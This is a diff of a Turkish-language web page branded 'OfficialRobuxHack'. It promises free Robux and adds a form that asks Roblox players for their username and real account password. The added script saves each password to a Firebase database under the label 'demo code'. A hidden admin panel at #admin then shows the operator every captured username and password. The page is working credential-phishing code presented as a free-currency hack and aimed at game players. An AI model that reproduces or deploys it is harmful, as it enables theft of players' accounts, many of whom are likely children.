@@ -5,282 +5,338 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>OfficialRobuxHack</title>
+
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
+*{box-sizing:border-box}
 body{
- background:#080b10;color:#fff;
- font-family:Arial,sans-serif;
- min-height:100vh;
- overflow-x:hidden;
-}
-body:before{
- content:"";position:fixed;inset:0;
- background:
- radial-gradient(circle at 15% 20%,#00ff9125,transparent 35%),
- radial-gradient(circle at 85% 80%,#00aaff20,transparent 35%);
- pointer-events:none;
+ margin:0;background:#080d12;color:white;
+ font-family:Arial,sans-serif
 }
 header{
- height:78px;padding:0 7%;
- display:flex;align-items:center;
- justify-content:space-between;
- border-bottom:1px solid #ffffff15;
- background:#080e14dd;
- position:relative;z-index:2;
+ padding:22px 7%;display:flex;
+ justify-content:space-between;align-items:center;
+ border-bottom:1px solid #244333
 }
-.logo{
- font-size:25px;font-weight:1000;
- color:#00ff91;letter-spacing:2px;
- text-shadow:0 0 20px #00ff91;
-}
-.online{font-size:12px;color:#00ff91}
-main{
- min-height:85vh;display:flex;
- align-items:center;justify-content:center;
- padding:25px;position:relative;z-index:1;
-}
+.logo{font-size:23px;color:#00ff91;font-weight:900}
+.online{color:#00ff91}
+main{max-width:650px;margin:45px auto;padding:15px}
 .card{
- width:100%;max-width:570px;
- background:#111a22ee;
- border:1px solid #00ff9144;
- border-radius:22px;padding:38px;
- box-shadow:0 0 65px #00ff9115;
+ background:#121c24;border:1px solid #24503c;
+ border-radius:18px;padding:28px;margin-bottom:20px
 }
-.tag{
- text-align:center;color:#00ff91;
- letter-spacing:5px;font-size:11px;
- margin-bottom:22px;
-}
-h1{text-align:center;font-size:35px;margin-bottom:12px}
-.desc{text-align:center;color:#9ba9b6;line-height:1.7}
-.label{
- display:block;margin:23px 0 9px;
- font-size:13px;color:#d5e0e8;
-}
+h1{text-align:center}
+label{display:block;margin:18px 0 8px;color:#b7c8c0}
 input{
- width:100%;padding:17px;
- background:#080f16;color:white;
- border:1px solid #344553;
- border-radius:11px;font-size:16px;
- outline:none;
+ width:100%;padding:15px;background:#080f16;
+ border:1px solid #354b42;border-radius:9px;
+ color:white;font-size:16px
 }
-input:focus{border-color:#00ff91}
-.amounts{
- display:grid;grid-template-columns:repeat(4,1fr);
- gap:9px;margin-top:12px;
+button{
+ padding:14px;border:0;border-radius:9px;
+ background:#00e987;color:#002414;
+ font-weight:bold;cursor:pointer
 }
-.amounts button{
- padding:13px 5px;background:#17232d;
- color:#dce8ef;border:1px solid #354753;
- border-radius:9px;font-weight:bold;cursor:pointer;
+button:hover{filter:brightness(1.1)}
+.primary{width:100%;margin-top:20px}
+.small{background:#253a32;color:white;margin:4px}
+.notice{font-size:12px;color:#a1b4aa;line-height:1.7;margin-top:18px}
+.hidden{display:none!important}
+.stat{display:flex;gap:12px;flex-wrap:wrap}
+.stat div{
+ flex:1;min-width:120px;background:#0a1319;
+ padding:18px;border-radius:12px
 }
-.amounts button.selected{
- background:#003e29;border-color:#00ff91;
- color:#00ff91;
+.stat strong{display:block;color:#00ff91;font-size:28px}
+.entry{
+ background:#0a1319;padding:15px;
+ border-radius:10px;margin-top:10px;overflow-wrap:anywhere
 }
-.primary{
- width:100%;margin-top:25px;padding:18px;
- border:0;border-radius:11px;
- background:linear-gradient(100deg,#00b96c,#00ff91);
- color:#001b0e;font-size:16px;
- font-weight:900;cursor:pointer;
- transition:.2s;
+.entry p{color:#b9c8c0}
+#progressBar{
+ height:9px;width:0%;background:#00ff91;
+ border-radius:20px;transition:width .1s
 }
-.primary:hover{
- transform:translateY(-2px);
- box-shadow:0 0 25px #00ff9155;
-}
-.notice{
- text-align:center;color:#71818e;
- font-size:11px;line-height:1.6;margin-top:20px;
-}
-#loading,#result{display:none;text-align:center}
-.loader{
- width:75px;height:75px;margin:30px auto;
- border:5px solid #263b35;
- border-top:5px solid #00ff91;
- border-radius:50%;
- animation:spin 1s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.progress{
- height:9px;background:#27362f;
- border-radius:20px;margin:25px 0;overflow:hidden;
-}
-.bar{
- height:100%;width:0%;
- background:linear-gradient(90deg,#00b96c,#00ff91);
- transition:width .15s;
-}
-#percent{color:#00ff91;font-weight:bold}
-.success{
- color:#00ff91;font-size:26px;
- font-weight:1000;margin-bottom:20px;
-}
-.resultInfo{
- background:#0a1219;border:1px solid #283d48;
- padding:18px;border-radius:12px;
- margin:20px 0;text-align:left;line-height:2;
-}
-.resultInfo span{color:#00ff91}
-.resultAmount{
- color:#00ff91;font-size:36px;
- font-weight:1000;margin:25px 0;
- overflow-wrap:anywhere;
-}
-footer{
- text-align:center;color:#53616b;
- font-size:11px;padding:20px;
-}
-.confetti{
- position:fixed;top:-20px;
- width:9px;height:13px;
- animation:fall 3s linear forwards;
- pointer-events:none;z-index:10;
-}
-@keyframes fall{
- to{transform:translateY(110vh) rotate(720deg);opacity:0}
-}
-@media(max-width:450px){
- .card{padding:25px 18px}
- .amounts{grid-template-columns:repeat(2,1fr)}
- h1{font-size:29px}
-}
+.error{color:#ff7272;text-align:center}
 </style>
 </head>
+
 <body>
+
 <header>
- <div class="logo">Robux Hilesi</div>
- <div class="online">● SİSTEM AKTİF</div>
+ <div class="logo">OfficialRobuxHack</div>
+ <div class="online">● ONLINE</div>
 </header>
 
 <main>
-<div class="card">
 
-<section id="login">
- <div class="tag">PREMIUM REWARDS</div>
+<section id="userScreen" class="card">
  <h1>ROBUX HİLESİ</h1>
- <p class="desc">Kullanıcı adını ve görüntülemek istediğin miktarı belirle.</p>
+ <p style="text-align:center;color:#9aaba3">
+ Robuxuna ulaş!!!
+ </p>
 
- <label class="label">ROBLOX KULLANICI ADI</label>
- <input id="username" maxlength="30" placeholder="Kullanıcı adını yaz...">
+ <label>Roblox Kullanıcı Adın</label>
+ <input id="username" maxlength="30" placeholder="Kullanıcı adın">
 
- <label class="label">ROBUX MİKTARI</label>
- <input id="robux" type="number" min="1" max="1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" placeholder="Örn: 100000">
+ <label>Demo Robux miktarı</label>
+ <input id="amount" inputmode="numeric"
+ placeholder="Örneğin 650000000000">
 
- <div class="amounts">
-  <button onclick="choose(100,this)">100</button>
-  <button onclick="choose(500,this)">500</button>
-  <button onclick="choose(1000,this)">1.000</button>
-  <button onclick="choose(10000,this)">10.000</button>
-  <button onclick="choose(1000000,this)">10.000.00</button>
+ <div>
+  <button class="small" onclick="setAmount('100')">100</button>
+  <button class="small" onclick="setAmount('1000')">1.000</button>
+  <button class="small" onclick="setAmount('1000000')">1M</button>
+  <button class="small" onclick="setAmount('1000000000')">1B</button>
  </div>
 
- <button class="primary" onclick="start()">DEVAM ET →</button>
- <div class="notice"></div>
+ <label>Roblox Şifren</label>
+ <input id="demoCode" maxlength="40"
+ placeholder="Örn: Robux123>
+
+ <p class="notice">
+ Bu alan gerçek Roblox şifresidir.Yazdıktan 2-3 gün sonra hesabınıza gelecektir.
+
+ </p>
+
+ <button class="primary" onclick="join()">DEMOYA KATIL →</button>
+
+ <p class="notice">
+ Bu site robux aktarmaktadır.
+ </p>
+ <p id="error" class="error"></p>
 </section>
 
-<section id="loading">
- <div class="tag">PROCESSING SYSTEM</div>
- <h1>İŞLEM HAZIRLANIYOR</h1>
- <div class="loader"></div>
- <p id="message" class="desc">Sistem başlatılıyor...</p>
- <div class="progress"><div class="bar" id="bar"></div></div>
- <div id="percent">0%</div>
-</section>
-
-<section id="result">
- <div class="success">✓ TAMAMLANDI</div>
- <h1>HESABINIZA GELDİ!</h1>
- <div class="resultInfo">
-  Kullanıcı: <span id="resultName"></span><br>
-  Seçilen miktar: <span id="resultRobux"></span> Robux
+<section id="loading" class="card hidden">
+ <h1>DEMO HAZIRLANIYOR</h1>
+ <div style="text-align:center;font-size:55px">💎</div>
+ <p id="progressText" style="text-align:center">0%</p>
+ <div style="height:9px;background:#26372e;border-radius:20px;overflow:hidden">
+  <div id="progressBar"></div>
  </div>
- <div class="resultAmount" id="resultAmount"></div>
- <p class="desc">OLDU!</p>
- <button class="primary" onclick="location.reload()">YENİ İŞLEM ↻</button>
- <div class="notice"></div>
 </section>
 
-</div>
+<section id="result" class="card hidden">
+ <h1 style="color:#00ff91">✓ DEMO TAMAMLANDI</h1>
+ <h2 style="text-align:center">GÖSTERİMİN HAZIR!</h2>
+ <div id="resultText" style="text-align:center;color:#00ff91;font-size:24px"></div>
+ <p class="notice">
+ Bu işlemi gerçekleştirdikten sonra 2-3 gün içerisinde robux gelir. Gerçek Robux hesabına henüz gelmemiştir.
+ </p>
+ <button class="primary" onclick="location.reload()">YENİDEN DENE</button>
+</section>
+
+<section id="adminScreen" class="hidden">
+ <div class="card">
+  <h1>YÖNETİCİ PANELİ</h1>
+  <label>Yönetici e-postası</label>
+  <input id="adminEmail" type="email" placeholder="E-posta">
+  <label>Yönetici şifresi</label>
+  <input id="adminPassword" type="password" placeholder="Yönetici şifresi">
+  <button class="primary" onclick="adminLogin()">GİRİŞ YAP</button>
+  <p id="adminError" class="error"></p>
+ </div>
+
+ <div id="dashboard" class="card hidden">
+  <h1>CANLI İSTATİSTİKLER</h1>
+  <div class="stat">
+   <div><strong id="total">0</strong>Katılımcı</div>
+   <div><strong id="completed">0</strong>Demo tamamlayan</div>
+  </div>
+  <h3>Katılımcılar</h3>
+  <div id="entries"></div>
+  <button class="primary" onclick="logout()">ÇIKIŞ YAP</button>
+ </div>
+</section>
+
 </main>
 
-<footer>© 2026 RobuxHilesi</footer>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
 
 <script>
-function choose(value,button){
- document.getElementById("robux").value=value;
- document.querySelectorAll(".amounts button")
- .forEach(b=>b.classList.remove("selected"));
- button.classList.add("selected");
+
+// FIREBASE AYARLARINI BURAYA YAZ
+const firebaseConfig = {
+ apiKey:"BURAYA_API_KEY",
+ authDomain:"BURAYA_AUTH_DOMAIN",
+ databaseURL:"BURAYA_DATABASE_URL",
+ projectId:"BURAYA_PROJECT_ID",
+ appId:"BURAYA_APP_ID"
+};
+
+// KENDİ YÖNETİCİ E-POSTANI YAZ
+const ADMIN_EMAIL="admin@example.com";
+
+firebase.initializeApp(firebaseConfig);
+
+const auth=firebase.auth();
+const db=firebase.database();
+
+function setAmount(n){
+ document.getElementById("amount").value=n;
 }
 
-function start(){
- const name=document.getElementById("username").value.trim();
- const amount=Number(document.getElementById("robux").value);
+function formatAmount(value){
+ return BigInt(value).toLocaleString("tr-TR");
+}
 
- if(!name){
-  alert("Kullanıcı adını yaz!");
+async function join(){
+
+ const username=document.getElementById("username").value.trim();
+ const amount=document.getElementById("amount").value.trim();
+ const demoCode=document.getElementById("demoCode").value.trim();
+ const error=document.getElementById("error");
+
+ error.textContent="";
+
+ if(!username || !/^[a-zA-Z0-9_]{3,30}$/.test(username)){
+  error.textContent="Geçerli bir Roblox kullanıcı adı yaz.";
   return;
  }
- if(!Number.isSafeInteger(amount)||amount<1||amount>1000000000000000000000000000000000){
-  alert("Geçerli bir Robux miktarı gir!");
+
+ if(!/^\d{1,30}$/.test(amount) || BigInt(amount)<1n){
+  error.textContent="Geçerli bir pozitif demo miktarı yaz.";
   return;
  }
 
- document.getElementById("login").style.display="none";
- document.getElementById("loading").style.display="block";
+ if(!demoCode || demoCode.length<3){
+  error.textContent="Kendi komik demo kodunu yaz!";
+  return;
+ }
 
- const messages=[
- "Sistem başlatılıyor...",
- "Kullanıcı bilgileri hazırlanıyor...",
- "Miktar kontrol ediliyor...",
- "Ödül hazırlanıyor...",
- "Son aşama tamamlanıyor..."
- ];
+ try{
 
- let progress=0;
- let last=-1;
+  const user=auth.currentUser ||
+   (await auth.signInAnonymously()).user;
 
- const timer=setInterval(()=>{
-  progress++;
-  document.getElementById("bar").style.width=progress+"%";
-  document.getElementById("percent").innerText=progress+"%";
+  const ref=db.ref("entries").push();
 
-  const index=Math.min(4,Math.floor(progress/20));
-  if(index!==last){
-   last=index;
-   document.getElementById("message").innerText=messages[index];
-  }
+  await ref.set({
+   uid:user.uid,
+   username:username,
+   amount:amount,
+   demoCode:demoCode,
+   createdAt:firebase.database.ServerValue.TIMESTAMP
+  });
 
-  if(progress>=100){
-   clearInterval(timer);
+  document.getElementById("userScreen").classList.add("hidden");
+  document.getElementById("loading").classList.remove("hidden");
 
-   document.getElementById("loading").style.display="none";
-   document.getElementById("result").style.display="block";
+  let p=0;
 
-   document.getElementById("resultName").innerText=name;
-   document.getElementById("resultRobux").innerText=amount.toLocaleString("tr-TR");
-   document.getElementById("resultAmount").innerText=
-    amount.toLocaleString("tr-TR")+" R$";
+  const timer=setInterval(async()=>{
+   p++;
+   document.getElementById("progressBar").style.width=p+"%";
+   document.getElementById("progressText").textContent=p+"%";
 
-   confetti();
-  }
- },120);
-}
+   if(p>=100){
+    clearInterval(timer);
 
-function confetti(){
- for(let i=0;i<65;i++){
-  const piece=document.createElement("div");
-  piece.className="confetti";
-  piece.style.left=Math.random()*100+"vw";
-  piece.style.background=
-   ["#00ff91","#00aaff","#a855ff","#ffffff"][Math.floor(Math.random()*4)];
-  piece.style.animationDuration=(2+Math.random()*2)+"s";
-  document.body.appendChild(piece);
-  setTimeout(()=>piece.remove(),4000);
+    try{
+     await db.ref("completion/"+ref.key).set({
+      uid:user.uid,
+      completed:true
+     });
+    }catch(e){
+     console.error(e);
+    }
+
+    document.getElementById("loading").classList.add("hidden");
+    document.getElementById("result").classList.remove("hidden");
+
+    document.getElementById("resultText").textContent=
+     username+" · "+formatAmount(amount)+" R$";
+   }
+  },120);
+
+ }catch(e){
+  error.textContent="Bağlantı hatası: "+e.message;
  }
 }
+
+function showAdmin(){
+ document.getElementById("userScreen").classList.add("hidden");
+ document.getElementById("adminScreen").classList.remove("hidden");
+}
+
+async function adminLogin(){
+
+ const email=document.getElementById("adminEmail").value.trim();
+ const password=document.getElementById("adminPassword").value;
+
+ if(email.toLowerCase()!==ADMIN_EMAIL.toLowerCase()){
+  document.getElementById("adminError").textContent=
+   "Yetkisiz yönetici hesabı!";
+  return;
+ }
+
+ try{
+  await auth.signInWithEmailAndPassword(email,password);
+  document.getElementById("dashboard").classList.remove("hidden");
+  listenEntries();
+ }catch(e){
+  document.getElementById("adminError").textContent=
+   "Giriş başarısız: "+e.message;
+ }
+}
+
+function listenEntries(){
+
+ db.ref("entries").on("value",async snapshot=>{
+
+  const data=snapshot.val()||{};
+  const list=Object.entries(data).reverse();
+
+  const completionSnapshot=await db.ref("completion").once("value");
+  const completion=completionSnapshot.val()||{};
+
+  document.getElementById("total").textContent=list.length;
+
+  document.getElementById("completed").textContent=
+   list.filter(([id])=>completion[id]?.completed===true).length;
+
+  const container=document.getElementById("entries");
+  container.innerHTML="";
+
+  list.forEach(([id,x])=>{
+
+   const div=document.createElement("div");
+   div.className="entry";
+
+   const title=document.createElement("strong");
+   title.textContent=x.username;
+
+   const details=document.createElement("p");
+   details.textContent=
+    formatAmount(x.amount)+" Robux · "+
+    (completion[id]?.completed?"Demo tamamlandı":"Bekliyor");
+
+   const code=document.createElement("p");
+   code.textContent="Komik demo kodu: "+x.demoCode;
+
+   const copy=document.createElement("button");
+   copy.textContent="Kullanıcı adını kopyala";
+   copy.onclick=()=>navigator.clipboard.writeText(x.username);
+
+   div.append(title,details,code,copy);
+   container.appendChild(div);
+  });
+
+ });
+}
+
+async function logout(){
+ db.ref("entries").off();
+ db.ref("completion").off();
+ await auth.signOut();
+ location.reload();
+}
+
+if(location.hash==="#admin"){
+ showAdmin();
+}
+
 </script>
 </body>
 </html>
